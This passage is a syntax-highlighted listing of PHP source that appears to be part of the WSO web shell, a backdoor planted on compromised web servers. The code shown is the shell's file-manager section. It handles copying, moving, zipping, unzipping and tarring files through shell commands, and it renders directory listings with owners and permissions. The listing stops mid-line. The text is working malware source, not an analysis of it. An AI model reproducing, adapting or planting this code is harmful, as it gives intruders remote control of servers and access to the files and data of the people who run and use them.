<span class="lineno"> 467</span>                                                             <span class="k">foreach</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span> <span class="o">@</span><span class="nb">rename</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$f</span><span class="p">,</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$f</span><span class="p">);</span>
<span class="lineno"> 468</span>                                                         <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;zip&#39;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 469</span>                                                             <span class="k">if</span> <span class="p">(</span><span class="nb">class_exists</span><span class="p">(</span><span class="s1">&#39;ZipArchive&#39;</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 470</span>                                                                 <span class="nv">$zip</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ZipArchive</span><span class="p">();</span>
<span class="lineno"> 471</span>                                                                 <span class="k">if</span> <span class="p">(</span><span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">open</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">],</span> <span class="mi">1</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 472</span>                                                                     <span class="nb">chdir</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]);</span>
<span class="lineno"> 473</span>                                                                     <span class="k">foreach</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 474</span>                                                                         <span class="k">if</span> <span class="p">(</span><span class="nv">$f</span> <span class="o">==</span> <span class="s1">&#39;..&#39;</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
<span class="lineno"> 475</span>                                                                         <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$f</span><span class="p">))</span> <span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">addFile</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$f</span><span class="p">,</span> <span class="nv">$f</span><span class="p">);</span>
<span class="lineno"> 476</span>                                                                         <span class="k">elseif</span> <span class="p">(</span><span class="o">@</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$f</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 477</span>                                                                             <span class="nv">$iterator</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">RecursiveIteratorIterator</span><span class="p">(</span><span class="k">new</span> <span class="nx">RecursiveDirectoryIterator</span><span class="p">(</span><span class="nv">$f</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span><span class="p">));</span>
<span class="lineno"> 478</span>                                                                             <span class="k">foreach</span> <span class="p">(</span><span class="nv">$iterator</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 479</span>                                                                                 <span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">addFile</span><span class="p">(</span><span class="nb">realpath</span><span class="p">(</span><span class="nv">$key</span><span class="p">),</span> <span class="nv">$key</span><span class="p">);</span>
<span class="lineno"> 480</span>                                                                             <span class="p">}</span>
<span class="lineno"> 481</span>                                                                         <span class="p">}</span>
<span class="lineno"> 482</span>                                                                     <span class="p">}</span>
<span class="lineno"> 483</span>                                                                     <span class="nb">chdir</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span>
<span class="lineno"> 484</span>                                                                     <span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
<span class="lineno"> 485</span>                                                                 <span class="p">}</span>
<span class="lineno"> 486</span>                                                             <span class="p">}</span>
<span class="lineno"> 487</span>                                                         <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;unzip&#39;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 488</span>                                                             <span class="k">if</span> <span class="p">(</span><span class="nb">class_exists</span><span class="p">(</span><span class="s1">&#39;ZipArchive&#39;</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 489</span>                                                                 <span class="nv">$zip</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ZipArchive</span><span class="p">();</span>
<span class="lineno"> 490</span>                                                                 <span class="k">foreach</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 491</span>                                                                     <span class="k">if</span> <span class="p">(</span><span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">open</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$f</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 492</span>                                                                         <span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">extractTo</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span>
<span class="lineno"> 493</span>                                                                         <span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
<span class="lineno"> 494</span>                                                                     <span class="p">}</span>
<span class="lineno"> 495</span>                                                                 <span class="p">}</span>
<span class="lineno"> 496</span>                                                             <span class="p">}</span>
<span class="lineno"> 497</span>                                                         <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;tar&#39;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 498</span>                                                             <span class="nb">chdir</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]);</span>
<span class="lineno"> 499</span>                                                             <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">array_map</span><span class="p">(</span><span class="s1">&#39;escapeshellarg&#39;</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]);</span>
<span class="lineno"> 500</span>                                                             <span class="nx">wsoEx</span><span class="p">(</span><span class="s1">&#39;tar cfzv &#39;</span> <span class="o">.</span> <span class="nb">escapeshellarg</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39; &#39;</span> <span class="o">.</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]));</span>
<span class="lineno"> 501</span>                                                             <span class="nb">chdir</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span>
<span class="lineno"> 502</span>                                                         <span class="p">}</span>
<span class="lineno"> 503</span>                                                         <span class="nb">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]);</span>
<span class="lineno"> 504</span>                                                         <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 505</span>                                                     <span class="k">default</span><span class="o">:</span>
<span class="lineno"> 506</span>                                                         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno"> 507</span>                                                             <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">];</span>
<span class="lineno"> 508</span>                                                             <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">];</span>
<span class="lineno"> 509</span>                                                             <span class="k">foreach</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$f</span><span class="p">)</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
<span class="lineno"> 510</span>                                                             <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
<span class="lineno"> 511</span>                                                         <span class="p">}</span>
<span class="lineno"> 512</span>                                                         <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 513</span>                                                     <span class="p">}</span>
<span class="lineno"> 514</span>                                                 <span class="p">}</span>
<span class="lineno"> 515</span>                                                 <span class="nv">$dirContent</span> <span class="o">=</span> <span class="o">@</span><span class="nb">scandir</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span>
<span class="lineno"> 516</span>                                                 <span class="k">if</span> <span class="p">(</span><span class="nv">$dirContent</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 517</span>                                                     <span class="k">echo</span> <span class="s1">&#39;Can\&#39;t open this folder!&#39;</span><span class="p">;</span>
<span class="lineno"> 518</span>                                                     <span class="nx">wsoFooter</span><span class="p">();</span>
<span class="lineno"> 519</span>                                                     <span class="k">return</span><span class="p">;</span>
<span class="lineno"> 520</span>                                                 <span class="p">}</span>
<span class="lineno"> 521</span>                                                 <span class="k">global</span> <span class="nv">$sort</span><span class="p">;</span>
<span class="lineno"> 522</span>                                                 <span class="nv">$sort</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
<span class="lineno"> 523</span>                                                 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno"> 524</span>                                                     <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;!s_([A-z]+)_(\d{1})!&#39;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="nv">$match</span><span class="p">))</span> <span class="nv">$sort</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$match</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$match</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
<span class="lineno"> 525</span>                                                 <span class="p">}</span>
<span class="lineno"> 526</span>                                                 <span class="k">echo</span> <span class="s2">&quot;&lt;script&gt;</span>
<span class="lineno"> 527</span> <span class="s2">  function sa() {</span>
<span class="lineno"> 528</span> <span class="s2">      for(i=0;i&lt;d.files.elements.length;i++)</span>
<span class="lineno"> 529</span> <span class="s2">          if(d.files.elements[i].type == &#39;checkbox&#39;)</span>
<span class="lineno"> 530</span> <span class="s2">              d.files.elements[i].checked = d.files.elements[0].checked;</span>
<span class="lineno"> 531</span> <span class="s2">  }</span>
<span class="lineno"> 532</span> <span class="s2">&lt;/script&gt;</span>
<span class="lineno"> 533</span> <span class="s2">&lt;table width=&#39;100%&#39; class=&#39;main&#39; cellspacing=&#39;0&#39; cellpadding=&#39;2&#39;&gt;</span>
<span class="lineno"> 534</span> <span class="s2">&lt;form name=files method=post&gt;&lt;tr&gt;&lt;th width=&#39;13px&#39;&gt;&lt;input type=checkbox onclick=&#39;sa()&#39; class=chkbx&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesMan</span><span class="se">\&quot;</span><span class="s2">,null,</span><span class="se">\&quot;</span><span class="s2">s_name_&quot;</span> <span class="o">.</span> <span class="p">(</span><span class="nv">$sort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">?</span> <span class="mi">0</span> <span class="o">:</span> <span class="mi">1</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">)&#39;&gt;Name&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesMan</span><span class="se">\&quot;</span><span class="s2">,null,</span><span class="se">\&quot;</span><span class="s2">s_size_&quot;</span> <span class="o">.</span> <span class="p">(</span><span class="nv">$sort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">?</span> <span class="mi">0</span> <span class="o">:</span> <span class="mi">1</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">)&#39;&gt;Size&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesMan</span><span class="se">\&quot;</span><span class="s2">,null,</span><span class="se">\&quot;</span><span class="s2">s_modify_&quot;</span> <span class="o">.</span> <span class="p">(</span><span class="nv">$sort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">?</span> <span class="mi">0</span> <span class="o">:</span> <span class="mi">1</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">)&#39;&gt;Modify&lt;/a&gt;&lt;/th&gt;&lt;th&gt;Owner/Group&lt;/th&gt;&lt;th&gt;&lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesMan</span><span class="se">\&quot;</span><span class="s2">,null,</span><span class="se">\&quot;</span><span class="s2">s_perms_&quot;</span> <span class="o">.</span> <span class="p">(</span><span class="nv">$sort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">?</span> <span class="mi">0</span> <span class="o">:</span> <span class="mi">1</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">)&#39;&gt;Permissions&lt;/a&gt;&lt;/th&gt;&lt;th&gt;Actions&lt;/th&gt;&lt;/tr&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 535</span>                                                 <span class="nv">$dirs</span> <span class="o">=</span> <span class="nv">$files</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno"> 536</span>                                                 <span class="nv">$n</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$dirContent</span><span class="p">);</span>
<span class="lineno"> 537</span>                                                 <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$n</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 538</span>                                                     <span class="nv">$ow</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getpwuid</span><span class="p">(</span><span class="o">@</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]));</span>
<span class="lineno"> 539</span>                                                     <span class="nv">$gr</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getgrgid</span><span class="p">(</span><span class="o">@</span><span class="nb">filegroup</span><span class="p">(</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]));</span>
<span class="lineno"> 540</span>                                                     <span class="nv">$tmp</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span> <span class="o">=&gt;</span> <span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">],</span> <span class="s1">&#39;path&#39;</span> <span class="o">=&gt;</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">],</span> <span class="s1">&#39;modify&#39;</span> <span class="o">=&gt;</span> <span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">filemtime</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">])),</span> <span class="s1">&#39;perms&#39;</span> <span class="o">=&gt;</span> <span class="nx">wsoPermsColor</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]),</span> <span class="s1">&#39;size&#39;</span> <span class="o">=&gt;</span> <span class="o">@</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]),</span> <span class="s1">&#39;owner&#39;</span> <span class="o">=&gt;</span> <span class="nv">$ow</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">?</span> <span class="nv">$ow</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="o">@</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]),</span> <span class="s1">&#39;group&#39;</span> <span class="o">=&gt;</span> <span class="nv">$gr</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">?</span> <span class="nv">$gr</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="o">@</span><span class="nb">filegroup</span><span class="p">(</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]));</span>
<span class="lineno"> 541</span>                                                     <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]))</span> <span class="nv">$files</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;type&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;file&#39;</span><span class="p">));</span>
<span class="lineno"> 542</span>                                                     <span class="k">elseif</span> <span class="p">(</span><span class="o">@</span><span class="nb">is_link</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]))</span> <span class="nv">$dirs</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;type&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;link&#39;</span><span class="p">,</span> <span class="s1">&#39;link&#39;</span> <span class="o">=&gt;</span> <span class="nb">readlink</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">])));</span>
<span class="lineno"> 543</span>                                                     <span class="k">elseif</span> <span class="p">(</span><span class="o">@</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span><span class="p">))</span> <span class="nv">$dirs</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;type&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;dir&#39;</span><span class="p">));</span>
<span class="lineno"> 544</span>                                                 <span class="p">}</span>
<span class="lineno"> 545</span>                                                 <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$sort</span><span class="p">;</span>
<span class="lineno"> 546</span>                                                 <span class="k">function</span> <span class="nf">wsoCmp</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span> <span class="nv">$b</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 547</span>                                                     <span class="k">if</span> <span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;size&#39;</span><span class="p">)</span> <span class="k">return</span> <span class="nb">strcmp</span><span class="p">(</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]]),</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$b</span><span class="p">[</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]]))</span> <span class="o">*</span> <span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">?</span> <span class="mi">1</span> <span class="o">:</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
<span class="lineno"> 548</span>                                                     <span class="k">else</span> <span class="k">return</span> <span class="p">((</span><span class="nv">$a</span><span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">]</span> <span class="o">&lt;</span> <span class="nv">$b</span><span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="o">-</span><span class="mi">1</span> <span class="o">:</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">?</span> <span class="mi">1</span> <span class="o">:</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
<span class="lineno"> 549</span>                                                 <span class="p">}</span>
<span class="lineno"> 550</span>                                                 <span class="nb">usort</span><span class="p">(</span><span class="nv">$files</span><span class="p">,</span> <span class="s2">&quot;wsoCmp&quot;</span><span class="p">);</span>
<span class="lineno"> 551</span>                                                 <span class="nb">usort</span><span class="p">(</span><span class="nv">$dirs</span><span class="p">,</span> <span class="s2">&quot;wsoCmp&quot;</span><span class="p">);</span>
<span class="lineno"> 552</span>                                                 <span class="nv">$files</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$dirs</span><span class="p">,</span> <span class="nv">$files</span><span class="p">);</span>
<span class="lineno"> 553</span>                                                 <span class="nv">$l</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno"> 554</span>                                                 <span class="k">foreach</span> <span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 555</span>                                                     <span class="k">echo</span> <span class="s1">&#39;&lt;tr&#39;</span> <span class="o">.</span> <span class="p">(</span><span class="nv">$l</span> <span class="o">?</span> <span class="s1">&#39; class=l1&#39;</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&gt;&lt;td&gt;&lt;input type=checkbox name=&quot;f[]&quot; value=&quot;&#39;</span> <span class="o">.</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;&quot; class=chkbx&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=# onclick=&quot;&#39;</span> <span class="o">.</span> <span class="p">((</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;file&#39;</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;</span> <span class="o">.</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;\&#39;, \&#39;view\&#39;)&quot;&gt;&#39;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span> <span class="o">:</span> <span class="s1">&#39;g(\&#39;FilesMan\&#39;,\&#39;&#39;</span> <span class="o">.</span> <span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;\&#39;);&quot; title=&#39;</span> <span class="o">.</span> <span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;link&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&gt;&lt;b&gt;[ &#39;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39; ]&lt;/b&gt;&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&#39;</span> <span class="o">.</span> <span class="p">((</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;file&#39;</span><span class="p">)</span> <span class="o">?</span> <span class="nx">wsoViewSize</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">])</span> <span class="o">:</span> <span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;&lt;/td&gt;&lt;td&gt;&#39;</span> <span class="o">.</span> <span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;modify&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;/td&gt;&lt;td&gt;&#39;</span> <span class="o">.</span> <span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;owner&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;group&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;/td&gt;&lt;td&gt;&lt;a href=# onclick=&quot;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;</span> <span class="o">.</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span> <span class="o">.</span> <span 